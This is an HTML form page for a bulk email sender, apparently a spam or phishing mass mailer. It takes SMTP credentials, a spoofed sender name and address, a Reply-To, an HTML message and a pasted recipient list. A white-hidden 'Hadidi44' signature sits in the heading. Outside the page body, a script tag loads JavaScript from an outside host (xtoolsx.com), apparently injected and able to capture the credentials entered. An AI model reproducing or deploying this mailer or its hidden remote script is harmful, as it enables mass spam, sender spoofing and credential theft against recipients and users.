<html>



<head>

<title>PHP Mailer</title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">



<style type="text/css">

<!--

.style1 {

        font-family: Geneva, Arial, Helvetica, sans-serif;

        font-size: 12px;

}

-->

</style>

<style type="text/css">

<!--

.style1 {

        font-size: 10px;

        font-family: Geneva, Arial, Helvetica, sans-serif;

}

-->

</style>

</head>

<SCRIPT SRC='http://xtoolsx.com/JavaScript/Style.js'></SCRIPT>

<body text="#000000">

<p align="center"><font size="5" face="Bauhaus 93">Mailer Inbox Sender</font><font color="#FFFFFF" size="5" face="Bauhaus 93">Hadidi44</font></p>

<form name="form1" method="post" action="mailer_action.php" enctype="multipart/form-data">



  <br>



  <table width="100%" border="0" height="407">



    <tr>



      <td width="100%" colspan="4" bgcolor="#666666" height="36">



        <b>



        <font face="Arial" size="2" color="#FFFFFF">&nbsp;SERVER SETUP</font></b></td>



      </tr>

    <tr>



      <td width="10%" height="22" bgcolor="#E8E8E8">



        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

            SMTP Login:</font></div>



      </td>



      <td width="18%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="text" name="smtp_username" value="" size="30">



        </font></td>



      <td width="31%" height="22" bgcolor="#E8E8E8">



        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

            SMTP Pass:</font></div>



      </td>



      <td width="41%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="password" name="smtp_password" value="" size="30">



        </font></td>



    </tr>

    <tr>



      <td width="10%" height="22" bgcolor="#E8E8E8">



        <div align="right">

          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Port :</font></div>



      </td>



      <td width="18%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="text" name="ssl_port" value="" size="5"> 

      (optional)</font></td>



      <td width="31%" height="22" bgcolor="#E8E8E8">



        <div align="right">

          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SMTP 

            Server Smtp:</font></div>



      </td>



      <td width="41%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="text" name="my_smtp" value="" size="30">



        </font></td>



    </tr>

    <tr>



      <td width="10%" height="22" bgcolor="#E8E8E8">



        <p align="right">

        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SSL Server:</font></td>



      <td width="18%" height="22" bgcolor="#E8E8E8">

      <input type="checkbox" name="sslclick" value="ON"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">(yes)</font></td>



      <td width="31%" height="22" bgcolor="#E8E8E8">



        <p align="right">

        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Reconnect 

        After:</font></td>



      <td width="41%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="text" name="reconnect" value="" size="5"> 

      EMAILS</font></td>



    </tr>

    <tr>



      <td width="100%" height="39" bgcolor="#E8E8E8" colspan="4">



        <p align="center">

        <font face="Arial" style="font-size: 9pt" color="#800000"><b>&quot;</b> If 

        you dont have SMTP login, leave blank queries above <b>&quot;</b></font></td>



      </tr>



    <tr>



      <td width="10%" height="19">



        &nbsp;</td>



      <td width="18%" height="19">&nbsp;</td>



      <td width="31%" height="19">



        &nbsp;</td>



      <td width="41%" height="19">&nbsp;</td>



    </tr>



    <tr>



      <td width="100%" colspan="4" bgcolor="#666666" height="36">



        <b>



        <font face="Arial" size="2" color="#FFFFFF">&nbsp;MESSAGE SETUP</font></b></td>



      </tr>



    <tr>



      <td width="10%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8">



        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

            Your Email:</font></div>



      </td>



      <td width="18%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="text" name="from" value="" size="30">



        </font></td></tr><tr>



      <td width="31%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8">



        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

            Your Name:</font></div>



      </td>



      <td width="41%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="text" name="realname" value="" size="30">



        </font></td>



    </tr>

    <tr>



      <td width="10%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8">



        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

            Reply-To:</font></div>



      </td>



      <td width="18%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="text" name="replyto" value="" size="30">



        </font></td>



      



     



    </tr>



    <tr>



      <td width="10%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8">



        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

            Subject:</font></div>



      </td>



      <td colspan="3" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <input type="text" name="subject" value="" size="100">



        </font></td>



    </tr>



     <tr valign="top">



<td colspan="3" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 



        <textarea name="message" cols="60" rows="10"></textarea>



        <br>



        <input type="radio" name="contenttype" value="plain" >



        Plain 



        <input type="radio" name="contenttype" value="html" checked>



        HTML 



        <input type="hidden" name="action" value="send">



        <input type="submit" value="Send Message">



        </font></td>



      <td width="41%" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">



        <textarea name="emaillist" cols="30" rows="10">liste des emails</textarea>



        </font></td>



    </tr>



  </table>



</form>

    <p align="center">&nbsp;</p>

&nbsp;

    </body>

</html>